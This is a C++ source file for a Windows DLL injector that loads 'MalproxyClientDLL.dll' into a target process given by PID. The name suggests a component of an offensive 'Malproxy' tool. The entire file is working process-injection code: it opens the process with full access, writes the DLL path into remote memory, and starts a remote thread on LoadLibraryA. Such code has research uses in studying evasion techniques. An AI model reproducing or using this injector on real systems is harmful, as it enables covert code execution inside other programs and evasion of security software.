// MalproxyClientInject.cpp : Inject the MalproxyClient DLL into the target process (PID)
// .\MalproxyClientInject.exe PID
//
#include <Windows.h> 
#include <iostream>
#include <psapi.h>
 

int main()
{
    //+++++++++++ Get arguments : .\MalproxyClientInject.exe PID ++++++++++++
    LPWSTR* szArglist;
    int nArgs;
    int i;

    szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
    if (NULL == szArglist)
    {
        wprintf(L"CommandLineToArgvW failed\n");
        return 0;
    }
    else for (i = 0; i < nArgs; i++) printf("%d: %ws\n", i, szArglist[i]);

    int processId = (DWORD)_wtoi(szArglist[1]);
    LocalFree(szArglist);
    

    //++++++++++++++ Open Process +++++++++++++++++++++
    HANDLE processHandleExtProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if(!processHandleExtProc) {
        printf("can't open the process");
        return 0;
    }
    else {
        printf("PID: %u\n", processId);
    }
    
    //+++++++++++++++++++++++++ Get the path ++++++++++++++++++
    DWORD buffSize = GetCurrentDirectoryA(0, NULL);
    char *path = new char[buffSize+30];
    GetCurrentDirectoryA(buffSize,path);
    strcat_s(path, buffSize + 30, "\\MalproxyClientDLL.dll");
    

    //+++++++++++++++ Injection +++++++++++++++++++++++++
    HMODULE hKernel32 =GetModuleHandle(TEXT("Kernel32"));
    PVOID  pAllocEx = 0;
    HANDLE hThread = NULL;
    DWORD hLibModule = 0;
    
    SIZE_T DllNameSize = (strlen(path) + 1);
    pAllocEx = VirtualAllocEx(processHandleExtProc, NULL, DllNameSize, MEM_COMMIT, PAGE_READWRITE);

    if (pAllocEx && hKernel32)
    {
        ::WriteProcessMemory(processHandleExtProc, pAllocEx, (void*)path, DllNameSize, NULL);
        LPTHREAD_START_ROUTINE startRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
        hThread = ::CreateRemoteThread(processHandleExtProc, NULL, 0,startRoutine, pAllocEx, 0, NULL);

        if (NULL != hThread)
        {
            ::WaitForSingleObject(hThread, INFINITE);
            ::GetExitCodeThread(hThread, &hLibModule);
            ::CloseHandle(hThread);
        }
    }
    else {
        printf("Memory Allocation issue");
        return 0;
    }
}

 